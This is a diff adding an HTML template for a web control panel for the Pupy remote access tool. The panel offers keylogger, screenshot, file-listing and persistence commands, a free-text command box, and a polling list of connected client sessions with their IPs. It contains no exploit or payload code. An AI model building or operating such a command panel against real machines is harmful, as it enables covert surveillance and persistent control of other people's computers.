@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pupy Control Panel</title>
+    <style>
+        body { font-family: Arial; background: #1e1e1e; color: #fff; padding: 20px; }
+        textarea, select, input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; background: #333; color: #0f0; border: none; }
+        h2 { color: #0ff; }
+        .sessions, .history { background: #292929; padding: 10px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h2>Pupy GUI Control Panel</h2>
+    <a href="/logout" style="color: red;">Logout</a>
+
+    <form method="post">
+        <label>Select a Command:</label>
+        <select onchange="this.form.command.value = this.value">
+            <option value="">-- Choose --</option>
+            <option value="run keylogger">Keylogger</option>
+            <option value="run screenshot">Screenshot</option>
+            <option value="ls">List Files</option>
+            <option value="run persistence">Persistence</option>
+        </select>
+
+        <input type="text" name="command" value="{{ command }}" placeholder="Or type a custom command..." required>
+        <input type="submit" value="Run Command">
+    </form>
+
+    <h3>Output:</h3>
+    <textarea rows="10" readonly>{{ output }}</textarea>
+
+    <div class="sessions">
+        <h3>Active Sessions (Dummy Data)</h3>
+        <ul>
+            {% for client in sessions %}
+                <li>{{ client['name'] }} - {{ client['ip'] }} - {{ client['os'] }}</li>
+            {% endfor %}
+        </ul>
+    </div>
+
+    <div class="history">
+        <h3>Command History</h3>
+        <ul>
+            {% for cmd in history %}
+                <li>{{ cmd.strip() }}</li>
+            {% endfor %}
+        </ul>
+    </div>
+
+<div id="sessions-container">
+    <h3>Active Sessions</h3>
+    <ul id="session-list">
+        <li>Loading sessions...</li>
+    </ul>
+</div>
+
+<script>
+function loadSessions() {
+    fetch('/api/sessions')
+    .then(res => res.json())
+    .then(data => {
+        let list = document.getElementById('session-list');
+        list.innerHTML = '';
+        if (data.length === 0) {
+            list.innerHTML = '<li>No active sessions</li>';
+        } else {
+            data.forEach(client => {
+                let li = document.createElement('li');
+                li.textContent = `${client.name || 'Unknown'} - ${client.ip} - ${client.os || 'OS'}`;
+                list.appendChild(li);
+            });
+        }
+    }).catch(err => {
+        document.getElementById('session-list').innerHTML = '<li>Error fetching sessions</li>';
+    });
+}
+setInterval(loadSessions, 5000);
+loadSessions();
+</script>
+
+</body>
+</html>
